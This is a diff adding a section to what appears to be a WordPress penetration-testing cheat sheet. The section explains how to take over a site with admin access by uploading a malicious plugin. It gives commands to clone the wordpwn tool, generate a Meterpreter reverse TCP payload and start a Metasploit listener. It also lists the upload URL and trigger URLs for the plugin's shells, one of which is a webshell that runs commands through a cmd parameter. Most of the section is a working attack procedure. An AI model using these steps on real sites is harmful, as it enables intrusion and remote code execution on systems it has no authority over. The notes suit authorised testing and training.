@@ -82,6 +82,38 @@ run
 
 ---
 
+## Malicious plugin upload (wordpwn)
+
+When the **Theme Editor** is disabled or PHP changes are reverted (“upload by some other means, such as SFTP”), use a **malicious plugin** instead. You need admin access (e.g. default or brute-forced creds).
+
+**Tool:** [wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) — generates a plugin zip containing a Meterpreter or webshell payload.
+
+```bash
+git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git
+cd malicious-wordpress-plugin
+
+# Generate plugin with meterpreter reverse TCP (set LHOST/LPORT)
+python3 wordpwn.py LHOST LPORT php/meterpreter/reverse_tcp
+
+# Start listener
+msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; run"
+```
+
+**Upload:** As admin, go to **Plugins → Add New → Upload Plugin** and upload the generated `malicious.zip`.  
+**URL:** `http://TARGET/wp-admin/plugin-install.php?tab=upload`
+
+**Activate** the plugin, then trigger the shell:
+
+| Trigger URL |
+|-------------|
+| `http://TARGET/wp-content/plugins/malicious/wetw0rk_maybe.php` |
+| `http://TARGET/wp-content/plugins/malicious/QwertyRocks.php` |
+| `http://TARGET/wp-content/plugins/malicious/SWebTheme.php?cmd=COMMAND` |
+
+Use the first or second for Meterpreter; the third runs a single command via `?cmd=`. Shell runs as the web server user (e.g. www-data).
+
+---
+
 ## Vulnerable Plugins
 
 ### mail-masta LFI (unauthenticated)
